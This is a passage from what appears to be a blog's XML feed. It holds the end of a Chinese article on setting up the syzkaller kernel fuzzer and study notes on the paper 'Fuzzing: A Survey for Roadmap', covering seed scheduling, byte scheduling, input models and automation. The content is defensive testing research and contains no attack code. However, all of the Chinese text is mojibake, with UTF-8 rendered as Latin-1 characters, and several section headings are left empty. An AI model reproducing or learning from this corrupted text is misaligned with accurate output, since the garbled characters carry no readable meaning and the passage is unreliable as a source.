¸ä»£ç è·¯å¾„ã€‚æ³¨æ„ï¼š<code>-gdb</code> é€‰é¡¹å¯èƒ½ä¼šå½±å“ VM å®ä¾‹æ•°é‡ï¼Œå› æ­¤å»ºè®®ä»…åœ¨è°ƒè¯•è‡ªå®šä¹‰ syscall æ—¶ä½¿ç”¨ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://xz.aliyun.com/news/2394">æ–‡ç«  - linuxä¸‹fuzzåˆè¯• - å…ˆçŸ¥ç¤¾åŒº</a><br><a href="https://www.freebuf.com/sectool/323886.html">Syzkallerå…¥é—¨çŸ¥è¯†æ€»ç»“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><br>  <a href="https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/#x86-64-linux%E8%99%9A%E6%8B%9F%E6%9C%BA">syzkaller fuzz å·¥å…·çš„ä½¿ç”¨æ–¹æ³•åŠå®è·µå®ä¾‹ | blingblingâ€™s blog</a><br>  <a href="https://kiprey.github.io/2021/11/syzkaller_1/#1-%E5%B0%86%E6%BC%8F%E6%B4%9E%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%BF%9B-kernel">syzkaller ç¯å¢ƒæ­å»º | Kipreyâ€™s Blog</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®ºæ–‡ç¬”è®°ï¼šFuzzing: A Survey for Roadmap</title>
      <link href="/2025/07/01/fuzz/paper/roadmap/"/>
      <url>/2025/07/01/fuzz/paper/roadmap/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>Fuzz testingï¼ˆfuzzingï¼Œå³æ¨¡ç³Šæµ‹è¯•ï¼‰åœ¨æ£€æµ‹å®‰å…¨æ¼æ´ä¸­å¤§æ”¾å¼‚å½©ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆtest casesï¼‰å¹¶è§‚æµ‹æ‰§è¡Œç»“æœæ¥å¯»æ‰¾æ¼æ´ï¼Œå¹¶ä¸”å·²åœ¨å¤§é‡çš„åº”ç”¨ä¸­å‘ç°äº†ä¸Šåƒä¸ªæ¼æ´ã€‚è™½ç„¶éå¸¸é«˜æ•ˆï¼Œfuzz ä»ç¼ºä¹ç³»ç»ŸåŒ–çš„å¯¹å…¶ç¼ºé™·çš„åˆ†æã€‚</p><ul><li>fuzz éœ€è¦ç¼©å°è¾“å…¥ç©ºé—´ï¼ˆinput spaceï¼‰ä¸ç¼ºé™·ç©ºé—´ï¼ˆdefect spaceï¼Œè§¦å‘ç¼ºé™·çš„è¾“å…¥ï¼‰é—´çš„å·®è·ï¼›åœ¨ä¸€ä¸ªåº”ç”¨å½“ä¸­ï¼Œæ¼æ´ï¼ˆdefectsï¼‰çš„å­˜åœ¨æ˜¯åˆ†æ•£çš„ï¼ˆspareï¼‰ï¼Œè¿™æ„å‘³ç€ defects space è¦æ¯” input space å°å¾—å¤šã€‚</li><li>fuzzing ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹è¿›è¡Œé‡å¤æµ‹è¯•â€”â€”è¿™éœ€è¦ä¸€ç§è‡ªåŠ¨åŒ–çš„æ–¹æ³•ï¼›ç”±äºæŸ¥è¯¢ä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œè‡ªåŠ¨åŒ–åœ°æ‰§è¡Œä¸åŒçš„ç¨‹åºä¼šæ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚</li></ul><h2 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 ç®€ä»‹"></a>0x01 ç®€ä»‹</h2><p>è½¯ä»¶æ¼æ´æ˜¯è®¡ç®—æœºç³»ç»Ÿä¸­çš„ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œè€Œ Fuzz testing å·²ç»æˆä¸ºæœ€æˆåŠŸçš„æ£€æµ‹ç¨‹åºæ¼æ´çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹æ¥é‡å¤æµ‹è¯•ç›®æ ‡ç¨‹åºå¹¶è§‚å¯Ÿå…¶å¼‚å¸¸ï¼ˆexceptionï¼‰â€”â€”å®‰å…¨æ¼æ´çš„æ ‡å¿—ï¼ˆindicatorï¼‰</p><p>Fuzzing é€šå¸¸æœ‰ç€ä¸€ç»„ç§å­ï¼ˆseedsï¼‰ï¼šinteresting inputsï¼Œæ–°çš„è¾“å…¥çš„ç”Ÿæˆåˆ™åŸºäºè¿™ç»„ç§å­è¿›è¡Œæ— é™çš„å˜å¼‚ï¼ˆmutateï¼‰</p><p>è™½ç„¶ fuzzing åœ¨å‘ç°å®‰å…¨æ¼æ´ä¸Šè·å¾—äº†å·¨å¤§çš„æˆåŠŸï¼Œåœ¨å¼€å‘é«˜æ•ˆçš„æ¼æ´æ£€æµ‹æ–¹æ¡ˆä¸Šä»å­˜åœ¨ç€ç¼ºé™·ï¼Œå¦‚ Fig.1 æ‰€ç¤ºï¼Œä¸‰ä¸ªä¸»è¦çš„ç¼ºé™·æ˜¯ï¼šè¾“å…¥ä¸­åˆ†æ•£çš„æ¼æ´ç©ºé—´ï¼Œä¸¥æ ¼çš„æœ‰æ•ˆè¾“å…¥ç©ºé—´ï¼Œå¤šç›®æ ‡çš„è‡ªåŠ¨åŒ–æ‰§è¡Œã€‚</p><p><img src="/assets/Pasted%20image%2020250621145238.png"></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong>Â åœ¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´åˆ†å¸ƒæ˜¯åˆ†æ•£çš„ï¼Œè€Œä»…æœ‰éƒ¨åˆ†ç‰¹å®šçš„è¾“å…¥èƒ½å¤Ÿè§¦å‘æ¼æ´ï¼›æµ…æ˜¾çš„æ¼æ´å¯ä»¥åœ¨çŸ­æ—¶é—´å†…è¢« fuzz åˆ°ï¼Œä½†è®¸å¤šå®‰å…¨æ¼æ´éœ€è¦æµ‹è¯•å¤æ‚çš„æ‰§è¡Œè·¯å¾„å¹¶è§£å†³ä¸¥æ ¼çš„è·¯å¾„çº¦æŸï¼Œå› æ­¤ä¸€ä¸ªé«˜æ•ˆçš„ fuzzing ç®—æ³•éœ€è¦åŒæ—¶å¯¹Â <em>å¾…æµ‹è¯•ç¨‹åº</em>Â ï¼ˆprogram under testï¼ŒÂ <strong>PUTs</strong>ï¼‰ä¸Â <em>å®‰å…¨ç¼ºé™·</em>Â ï¼ˆsecurity flawsï¼‰è¶³å¤Ÿç²¾é€šï¼Œä»¥åœ¨ä¸€ä¸ªæ›´æœ‰å¯èƒ½å­˜åœ¨æ¼æ´çš„ä»£ç åŒºåŸŸé©±åŠ¨è®¡ç®—èµ„æº</li><li><strong>Gap 2: strict valid input space.</strong>Â å¤§éƒ¨åˆ†ç¨‹åºæœ‰ç€è‡ªå·±çš„è¾“å…¥ç©ºé—´ï¼Œè€Œç°ä»£ç¨‹åºéƒ½ç›¸å½“å¤æ‚ï¼Œéœ€è¦æ›´å¤æ‚çš„ç‰¹åŒ–è¾“å…¥ç©ºé—´ï¼Œå› æ­¤å¦‚ä½•ç”Ÿæˆæœ‰æ•ˆè¾“å…¥åŒæ ·æ˜¯ä¸ªæŒ‘æˆ˜ï¼›æ­¤å¤–ï¼Œä¸ºäº†æé«˜ fuzzing çš„æ•ˆç‡ï¼Œç”Ÿæˆçš„è¾“å…¥åº”å½“ä½¿ç”¨ä¸åŒçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚Â <em>ä»£ç è¦†ç›–ç‡</em>Â ï¼‰ï¼Œè¿™éœ€è¦æ›´å…ˆè¿›çš„æ–¹æ¡ˆæ¥ç”Ÿæˆæœ‰æ•ˆè¾“å…¥ï¼›è‹¥ç¼ºä¹å¯¹ PUTs çš„ç³»ç»ŸåŒ–åˆ†æï¼Œå‡ ä¹ä¸å¯èƒ½ç²¾ç¡®åœ°é™åˆ¶è¾“å…¥ç©ºé—´ï¼ˆä¾‹å¦‚ PDF æ–‡ä»¶çš„å˜å¼‚ç”Ÿæˆå¯èƒ½ä¼šè¿å PDF è§„èŒƒï¼‰</li><li><strong>Gap 3: various target.</strong>Â ç”±äº fuzzing å¤§é‡é‡å¤åœ°æµ‹è¯• PUTsï¼Œè¿™éœ€è¦é«˜æ•ˆçš„è‡ªåŠ¨åŒ–æ–¹æ³•ã€‚PUTs ä¸æ¼æ´éƒ½æ˜¯å¤šç§å¤šæ ·çš„ï¼Œæœ‰çš„ç¨‹åºå¯ä»¥ç®€å•ç›´æ¥åœ°è¢«è‡ªåŠ¨åŒ–åœ° fuzzï¼ˆä¾‹å¦‚å‘½ä»¤è¡Œç¨‹åºï¼‰ï¼Œä½†è®¸å¤šç¨‹åºåœ¨è‡ªåŠ¨åŒ–æµ‹è¯•å‰éƒ½éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼ˆä¾‹å¦‚ç¡¬ä»¶ï¼‰ï¼›æ­¤å¤–ï¼Œå®‰å…¨ç¼ºé™·åŒæ ·éœ€è¦è‡ªåŠ¨åŒ–çš„ indicator ä»¥è®°å½•æ½œåœ¨çš„çœŸæ­£æ¼æ´ï¼Œ<strong>ç¨‹åºå´©æºƒ</strong>æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ indicator å› ä¸ºå…¶å¯ä»¥è¢« OS è‡ªåŠ¨æ•è·ï¼Œä½†æœ‰çš„å®‰å…¨ç¼ºé™·<strong>å¹¶ä¸ä¼šè¡¨ç°å‡ºå´©æºƒ</strong>ï¼ˆä¾‹å¦‚æ¡ä»¶ç«äº‰ï¼‰ï¼Œè¿™éœ€è¦ç²¾å¿ƒè®¾è®¡çš„ indicator</li></ul><p>ä¸šç•Œåœ¨ç¼©å°è¿™äº›ç¼ºé™·ä¸Šåšå‡ºäº†è®¸å¤šåŠªåŠ›ã€‚åœ¨æœ¬ç¯‡è®ºæ–‡ä¸­ï¼Œç ”ç©¶è€…ç³»ç»ŸåŒ–åœ°å›é¡¾ä¸åˆ†æäº† fuzzing çš„ç¼ºé™·ä¸è§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶è€ƒè™‘äº†å¹¿åº¦ä¸æ·±åº¦ã€‚</p><h2 id="0x02-Fuzzing-æ¦‚è¿°"><a href="#0x02-Fuzzing-æ¦‚è¿°" class="headerlink" title="0x02 Fuzzing æ¦‚è¿°"></a>0x02 Fuzzing æ¦‚è¿°</h2><p><img src="/assets/Pasted%20image%2020250628152009.png"></p><p>é¦–å…ˆä»‹ç»ä¸€äº›æœ¯è¯­ï¼ˆ<strong>Terminologies</strong>ï¼‰ï¼Œå¦‚ Fig2 æ‰€ç¤ºï¼š</p><ul><li><strong>seed</strong>ï¼šè¢«ä¿ç•™çš„èƒ½å®Œæˆæ›´å¥½çš„ fitness çš„è¾“å…¥ï¼ˆä¾‹å¦‚æä¾›æ–°çš„è¦†ç›–ç‡ï¼‰</li><li><strong>fitness</strong>ï¼šå¯¹ä¸€ä¸ª input&#x2F;seed çš„è´¨é‡çš„æµ‹é‡</li><li><strong>power schedule</strong>ï¼šå†³å®šäº†åˆ†é…ç»™ seeds çš„ energy</li><li><strong>energy</strong>ï¼šåˆ†é…ç»™å½“å‰ fuzzing round çš„å˜å¼‚æ•°é‡</li><li><strong>fuzzer</strong>ï¼šfuzzing ç®—æ³•çš„å®ç°</li></ul><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œfuzzing ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li><strong>input generator</strong>ï¼šè´Ÿè´£å‘ executor æä¾›è¾“å…¥</li><li><strong>executor</strong>ï¼šè´Ÿè´£æ‰§è¡Œè¾“å…¥</li><li><strong>defect monitor</strong>ï¼šè´Ÿè´£æ£€æŸ¥æ˜¯å¦å‘ç°äº†æ–°çš„æ‰§è¡ŒçŠ¶æ€æˆ–ç¼ºé™·ï¼ˆä¾‹å¦‚crashesï¼‰</li></ul><p>åŸºäºè¾“å…¥çš„ç”Ÿæˆæ–¹å¼ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>åŸºäºç”Ÿæˆçš„</strong>ï¼ˆgeneration-basedï¼‰ï¼šåŸºäºÂ <em>æ–‡æ³•</em>Â ï¼ˆgrammarsï¼‰æˆ–Â <em>æœ‰æ•ˆè¯­æ–™åº“</em>Â ï¼ˆvalid corpusï¼‰ä»å¤´å¼€å§‹ç”Ÿæˆï¼›å¦‚ Fig2 æ‰€ç¤ºï¼Œå…¶ä»ä¸€ç»„ç§å­ä¸­ç›´æ¥è·å¾—è¾“å…¥</li><li><strong>åŸºäºå˜å¼‚çš„</strong>ï¼ˆmutation-basedï¼‰ï¼šå¯¹ç°æœ‰çš„ç§å­è¿›è¡ŒÂ <em>å˜å¼‚</em>Â ï¼ˆmutateï¼‰ä»¥è·å¾—æ–°çš„è¾“å…¥ï¼›å¯¹ç»™å®šçš„ä¸€ç»„ç§å­ï¼ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•é€šè¿‡ seed scheduleã€byte scheduleã€mutation schedule ä»¥è·å¾—è¾“å…¥</li></ul><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œfuzzing å¹¶ä¸éœ€è¦ç»å† Fig2 ä¸­çš„æ‰€æœ‰æ­¥éª¤ï¼Œä¾‹å¦‚åŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•å¹¶ä¸æ‰§è¡Œ byte schedule æˆ– mutation scheduleï¼Œä½†å…³æ³¨äºä»åˆå§‹è¾“å…¥æ–‡ä»¶ä¸­é€‰æ‹©æœ€ä¼˜çš„ç§å­ç»„ã€‚</p></blockquote><p>åŸºäºæ‰§è¡Œæ—¶è§‚æµ‹åˆ°çš„ä¿¡æ¯é‡ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>é»‘ç›’</strong>ï¼ˆblackboxï¼‰ï¼šé»‘ç›’æ¨¡ç³Šæµ‹è¯•å¹¶ä¸çŸ¥é“æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€ï¼Œé€šè¿‡ä½¿ç”¨è¾“å…¥æ ¼å¼åŒ–æˆ–ä¸åŒçš„è¾“å…¥çŠ¶æ€æ¥è¿›è¡Œä¼˜åŒ–</li><li><strong>ç™½ç›’</strong>ï¼ˆwhiteboxï¼‰ï¼šç™½ç›’æ¨¡ç³Šæµ‹è¯•å¯¹æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€æ˜¯å…¨éƒ¨å¾—çŸ¥çš„ï¼Œè¿™ä½¿å…¶èƒ½ç³»ç»ŸåŒ–åœ°æ¢ç´¢ç›®æ ‡ç¨‹åºçš„çŠ¶æ€ç©ºé—´ï¼›å…¶é€šå¸¸ä½¿ç”¨ concolic executionï¼ˆä¾‹å¦‚ dynamic symbolic executionï¼Œå³åŠ¨æ€ç¬¦å·æ‰§è¡Œï¼‰æ¥åˆ†æç›®æ ‡ç¨‹åº</li><li><strong>ç°ç›’</strong>ï¼ˆgreyboxï¼‰ï¼šç°ç›’æ¨¡ç³Šæµ‹è¯•è·å¾—çš„æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯åœ¨é»‘ç›’ä¸ç™½ç›’ä¹‹é—´ï¼Œä¾‹å¦‚è®¸å¤š fuzzer éƒ½ä½¿ç”¨<strong>è¾¹ç•Œè¦†ç›–ç‡</strong>ï¼ˆedge coverageï¼‰ä½œä¸ºå†…éƒ¨æ‰§è¡ŒçŠ¶æ€ã€‚</li></ul><p>æœ€é€šç”¨çš„æ‰§è¡ŒçŠ¶æ€ä¾¿æ˜¯ä»£ç è¦†ç›–ç‡ï¼ˆcode coverageï¼Œä¾‹å¦‚ CFGsï¼‰</p><h2 id="0x03-Fuzzing-ç†è®º"><a href="#0x03-Fuzzing-ç†è®º" class="headerlink" title="0x03 Fuzzing ç†è®º"></a>0x03 Fuzzing ç†è®º</h2><p>ä¸ºäº†æé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ï¼Œfuzzer åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨åé¦ˆï¼ˆfeedbackï¼‰æœºåˆ¶ï¼Œä¾‹å¦‚ä»¥æ‰§è¡ŒçŠ¶æ€æˆ–ç»“æœä½œä¸º fitnesï¼Œä¸€ä¸ªå…¸å‹çš„ fitness ä¾¿æ˜¯åŸºäºä»£ç è¦†ç›–ç‡ï¼ˆä¾‹å¦‚åŸºæœ¬å—æˆ–è¾¹ï¼‰è¿›è¡Œè¾“å…¥ç”Ÿæˆï¼Œä½†ä»…æœ‰ä»£ç è¦†ç›–ç‡<strong>å¹¶éä¸€ç›´éƒ½æ˜¯å¯é çš„</strong>ï¼Œå°±ç®—å¯é ä¹Ÿå¯èƒ½æ”¶ç›Šä¸é«˜ï¼ˆä¾‹å¦‚æŒ‡æ•°å‹æ•°é‡çš„è¾“å…¥ç”Ÿæˆå¯èƒ½åªå¸¦æ¥çº¿æ€§çš„æ¼æ´å‘ç°ï¼‰ï¼Œå› æ­¤ä¸€ç§å¸¸è§çš„æ”¹è¿›æ–¹æ³•æ˜¯ä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹æˆ–æ˜¯ä¸º fitness ä¸°å¯Œä¿¡æ¯ï¼ŒTable 1 å±•ç¤ºäº†ä¸åŒçš„ fuzzer çš„ä¼˜åŒ–æ–¹æ³•ï¼š</p><p><img src="/assets/Pasted%20image%2020250628153048.png"></p><h3 id="3-1-ç§å­é›†é€‰æ‹©"><a href="#3-1-ç§å­é›†é€‰æ‹©" class="headerlink" title="3.1 ç§å­é›†é€‰æ‹©"></a>3.1 ç§å­é›†é€‰æ‹©</h3><p>å¯¹ç§å­é›†çš„ä¼˜åŒ–å…³æ³¨äº<strong>æœ€å°åŒ–ç§å­é›†çš„å¤§å°</strong>ï¼Œä¾‹å¦‚é€‰æ‹©èƒ½è¦†ç›–æ‰€æœ‰å·²å‘ç°ä»£ç è¦†ç›–çš„ä¸€ç»„æœ€å°‘çš„ç§å­ï¼Œå› ä¸ºè¿‡äºå¯Œé›†çš„ç§å­ä¼šåœ¨æ£€éªŒå·²æ¢æµ‹ä»£ç åŒºåŸŸä¸Šæµªè´¹è®¡ç®—èµ„æº</p><blockquote><p>åœ¨Â <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX çš„ä¸€ç¯‡è®ºæ–‡</a>Â ä¸­å…¶è¢«è¡¨è¿°ä¸ºÂ <em>æœ€å°è¦†ç›–é›†é—®é¢˜</em>Â ï¼ˆminimal set coverage problemï¼ŒMSCPï¼‰</p></blockquote><h3 id="3-2-ç§å­è°ƒåº¦"><a href="#3-2-ç§å­è°ƒåº¦" class="headerlink" title="3.2 ç§å­è°ƒåº¦"></a>3.2 ç§å­è°ƒåº¦</h3><p><strong>ç§å­è°ƒåº¦</strong>ï¼ˆSeed Scheduleï¼‰æœŸæœ›è§£å†³å¦‚ä¸‹é—®é¢˜ï¼š</p><ul><li>åœ¨ä¸‹ä¸€è½®ä¸­é€‰æ‹©å“ªä¸ªç§å­</li><li>ä¸ºè¯¥ç§å­åˆ†é…çš„æ—¶é—´é¢„ç®—ï¼ˆtime budgetï¼‰ï¼›å¤§éƒ¨åˆ† fuzzer å®é™…ä¸Šé€‰æ‹©ä¼˜åŒ–å¯¹è¢«é€‰å–ç§å­çš„å˜å¼‚æ¬¡æ•°</li></ul><p>ç”±äº PUTs ä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œæœªå‘ç°ä»£ç è¦†ç›–ç‡ä¸æœªå‘ç°æ¼æ´æ˜¯ä¸å¯çŸ¥çš„ï¼Œæˆ‘ä»¬æ— æ³•çŸ¥é“ä¸€ä¸ªè¾“å…¥æ˜¯å¦èƒ½è§¦å‘æ¼æ´ï¼Œç±»ä¼¼åœ°åœ¨æ£€ç´¢ä»£ç ä¹‹å‰æˆ‘ä»¬ä¹Ÿä¸èƒ½è·å¾—ç¨‹åºè¡Œä¸ºçš„æ¦‚ç‡åˆ†å¸ƒï¼Œå› æ­¤æ•°å­¦ä¸Šæˆ‘ä»¬å‡ ä¹ä¸å¯èƒ½æ‰¾åˆ°ä¸€ä¸ªå…¨é¢çš„ä¼˜åŒ–è§£æ³•ï¼Œå› æ­¤ç ”ç©¶äººå‘˜åŸºäºå¤šç§ä¼˜åŒ–æ–¹æ³•æ¥è¿‘ä¼¼åœ°è§£å†³è¿™ä¸ªé—®é¢˜</p><h4 id="3-2-1-Fitness-by-Bugs"><a href="#3-2-1-Fitness-by-Bugs" class="headerlink" title="3.2.1 Fitness by Bugs"></a>3.2.1 Fitness by Bugs</h4><h4 id="3-2-2-Fitness-by-State-Transitionï¼ˆMarkov-Chainï¼‰"><a href="#3-2-2-Fitness-by-State-Transitionï¼ˆMarkov-Chainï¼‰" class="headerlink" title="3.2.2 Fitness by State Transitionï¼ˆMarkov Chainï¼‰"></a>3.2.2 <em>Fitness by State Transitionï¼ˆMarkov Chainï¼‰</em></h4><h3 id="3-3-å­—èŠ‚è°ƒåº¦"><a href="#3-3-å­—èŠ‚è°ƒåº¦" class="headerlink" title="3.3 å­—èŠ‚è°ƒåº¦"></a>3.3 å­—èŠ‚è°ƒåº¦</h3><p><strong>å­—èŠ‚è°ƒåº¦</strong>ï¼ˆByte Scheduleï¼‰å†³å®šäº†Â <em>é€‰æ‹©ç§å­ä¸­ä¸€ä¸ªå­—èŠ‚æ¥å˜å¼‚</em>Â çš„é¢‘ç‡ã€‚å¤§éƒ¨åˆ† fuzzer åŸºäºæ‰§è¡Œä¿¡æ¯æ¥è¯•æ¢æ€§åœ°æˆ–éšæœºåœ°é€‰æ‹©å­—èŠ‚ï¼Œè¿™éœ€è¦æ¯” seed schedule å¯¹ç¨‹åºè¡Œä¸ºæœ‰ç€æ›´æ·±åˆ»çš„äº†è§£ï¼ˆä¾‹å¦‚è·¯å¾„çº¦æŸæˆ–æ•°æ®æµï¼‰ï¼Œç”±æ­¤ fuzzer å¯ä»¥å…³æ³¨äºä¸€ä¸ªä¸é‚£ä¹ˆå¤æ‚çš„é—®é¢˜â€”â€”å­—èŠ‚å¦‚ä½•å½±å“æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼Œç§°ä¸ºå­—èŠ‚çš„<strong>é‡è¦æ€§</strong>ï¼ˆimportanceï¼‰</p><h3 id="3-4-Mutation-Operator-Schedule"><a href="#3-4-Mutation-Operator-Schedule" class="headerlink" title="3.4 Mutation Operator Schedule"></a>3.4 Mutation Operator Schedule</h3><h3 id="3-5-Diverse-Information-For-Fitness"><a href="#3-5-Diverse-Information-For-Fitness" class="headerlink" title="3.5 Diverse Information For Fitness"></a>3.5 Diverse Information For Fitness</h3><h3 id="3-6-Evaluation-Theory"><a href="#3-6-Evaluation-Theory" class="headerlink" title="3.6 Evaluation Theory"></a>3.6 Evaluation Theory</h3><h2 id="0x04-æœç´¢è¾“å…¥ç©ºé—´"><a href="#0x04-æœç´¢è¾“å…¥ç©ºé—´" class="headerlink" title="0x04 æœç´¢è¾“å…¥ç©ºé—´"></a>0x04 æœç´¢è¾“å…¥ç©ºé—´</h2><p>ä¸ºäº†ç¼©å°è¾“å…¥ç©ºé—´ã€æå‡æ¨¡ç³Šæµ‹è¯•çš„æ€§èƒ½ï¼Œfuzzers å°†ä¸€ä¸ªè¾“å…¥ä¸­çš„å…³è”å­—èŠ‚åˆ†ç»„å¹¶ä¸ºæ¯ä¸€ç»„ä½¿ç”¨ç‰¹å®šçš„å˜å¼‚å™¨ï¼ˆåŒ…æ‹¬å­—èŠ‚å˜å¼‚ä¸å—å˜å¼‚ï¼‰</p><p>åœ¨è·¯å¾„çº¦æŸæ±‚è§£ä¸­ï¼Œå¯¹å…³è”å­—èŠ‚çš„å…³æ³¨åŒæ ·èƒ½ç¼©å°æœç´¢ç©ºé—´ã€‚</p><h3 id="4-1-Byte-constraint-Relation"><a href="#4-1-Byte-constraint-Relation" class="headerlink" title="4.1 Byte-constraint Relation"></a>4.1 Byte-constraint Relation</h3><h3 id="4-2-Concolic-Execution"><a href="#4-2-Concolic-Execution" class="headerlink" title="4.2 Concolic Execution"></a>4.2 Concolic Execution</h3><h3 id="4-3-ç¨‹åºè½¬æ¢"><a href="#4-3-ç¨‹åºè½¬æ¢" class="headerlink" title="4.3 ç¨‹åºè½¬æ¢"></a>4.3 ç¨‹åºè½¬æ¢</h3><p>å¯¹æ¨¡ç³Šæµ‹è¯•è€Œè¨€ï¼Œç¨‹åºè½¬æ¢ï¼ˆProgram Transformationï¼‰çš„ç›®çš„æ˜¯ç§»é™¤é˜²æ­¢æ¨¡ç³Šæµ‹è¯•å‘ç°æ›´å¤šæ‰§è¡ŒçŠ¶æ€çš„å®Œæ•´æ€§æ£€æŸ¥ï¼Œé€šè¿‡ç§»é™¤è¿™äº›æ£€æŸ¥ï¼Œæ¨¡ç³Šæµ‹è¯•å¯ä»¥æ¢ç´¢åˆ°ç›®æ ‡ç¨‹åºæ›´æ·±å¤„çš„ä»£ç å¹¶æš´éœ²å‡ºæ½œåœ¨çš„æ¼æ´ï¼Œä½†è¿™ä¹Ÿä¼šå¼•å…¥ä¸€äº›è¯¯æŠ¥ï¼ˆfalse positivesï¼‰ï¼Œå¯ä»¥é€šè¿‡ç¬¦åˆæ‰§è¡Œè¿›è¡ŒéªŒè¯ã€‚</p><p>å› æ­¤ Program Transformation é€šè¿‡èšç„¦äºå¯èƒ½è§¦å‘æ¼æ´çš„è¾“å…¥æ¥ç¼©å°æ¢ç´¢ç©ºé—´ã€‚</p><h3 id="4-4-Input-Model"><a href="#4-4-Input-Model" class="headerlink" title="4.4 Input Model"></a>4.4 Input Model</h3><p>è®¸å¤šåº”ç”¨ç¨‹åºéƒ½éœ€è¦é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥ï¼Œä¾‹å¦‚åè®®å®ç°ã€ç³»ç»Ÿè°ƒç”¨ç­‰ï¼Œè¾“å…¥æ¨¡å‹ï¼ˆinput modelï¼‰æŒ‡å®šäº†æ„é€ é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥çš„è§„åˆ™ï¼ŒåŒ…æ‹¬ç»“æ„ä½“ã€æ ¼å¼ã€è¾“å…¥çš„æ•°æ®çº¦æŸï¼Œå³è¿åè¯­æ³•æˆ–è¯­ä¹‰çš„è¾“å…¥ä¼šåœ¨ä¸€å¼€å§‹å°±è¢«æ‹’ç»ï¼Œç”±æ­¤è¾“å…¥ç©ºé—´ä¾¿è¢«é™åˆ¶äºè¾“å…¥æ¨¡å‹ã€‚</p><h3 id="4-5-Fragment-Recombination"><a href="#4-5-Fragment-Recombination" class="headerlink" title="4.5 Fragment Recombination"></a>4.5 Fragment Recombination</h3><h3 id="4-6-Format-Inference"><a href="#4-6-Format-Inference" class="headerlink" title="4.6 Format Inference"></a>4.6 Format Inference</h3><h4 id="4-6-1-Corpus-based"><a href="#4-6-1-Corpus-based" class="headerlink" title="4.6.1 Corpus-based"></a>4.6.1 Corpus-based</h4><h4 id="4-6-2-Coverage-based"><a href="#4-6-2-Coverage-based" class="headerlink" title="4.6.2 Coverage-based"></a>4.6.2 Coverage-based</h4><h4 id="4-6-3-Encoding-Function"><a href="#4-6-3-Encoding-Function" class="headerlink" title="4.6.3 Encoding Function"></a>4.6.3 Encoding Function</h4><h3 id="4-7-Dependency-Inference"><a href="#4-7-Dependency-Inference" class="headerlink" title="4.7 Dependency Inference"></a>4.7 Dependency Inference</h3><p>æ ¼å¼æ¨æ–­ä¸»è¦è§£å†³è¯­æ³•éœ€æ±‚ï¼Œè¿™ä»å¯èƒ½ç”Ÿæˆæœ‰ç€é”™è¯¯æ•°æ®ä¾èµ–é¡¹çš„è¾“å…¥ã€‚</p><h2 id="0x05-è‡ªåŠ¨åŒ–"><a href="#0x05-è‡ªåŠ¨åŒ–" class="headerlink" title="0x05 è‡ªåŠ¨åŒ–"></a>0x05 è‡ªåŠ¨åŒ–</h2><p>è‡ªåŠ¨æ‰§è¡Œæ˜¯æ¨¡ç³Šæµ‹è¯•ç†è®ºä¸è¾“å…¥ç©ºé—´å‡æ–¹æ³•çš„åŸºç¡€ï¼Œè€ŒæˆåŠŸçš„æ¨¡ç³Šæµ‹è¯•éœ€è¦ï¼š</p><ul><li>è‡ªåŠ¨é‡å¤åœ°è¿è¡Œ PUTsã€‚å¤§éƒ¨åˆ† fuzzer éƒ½èƒ½æµ‹è¯•å‘½ä»¤è¡Œç¨‹åºï¼Œä½†å¯¹äºç¡¬ä»¶æˆ–å¤šè¯­è¨€è€Œè¨€ä¸è¡Œã€‚</li><li>å¯¹æ½œåœ¨æ¼æ´çš„è‡ªåŠ¨æŒ‡ç¤ºå™¨</li><li>é«˜é€Ÿæ‰§è¡Œã€‚åœ¨ç›¸åŒçš„æ—¶é—´å†…æ£€éªŒæ›´å¤šçš„æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥æ­¤å¢åŠ å‘ç°æ¼æ´çš„æœºä¼šã€‚</li></ul><h3 id="5-1-Automatic-Execution-of-PUTs"><a href="#5-1-Automatic-Execution-of-PUTs" class="headerlink" 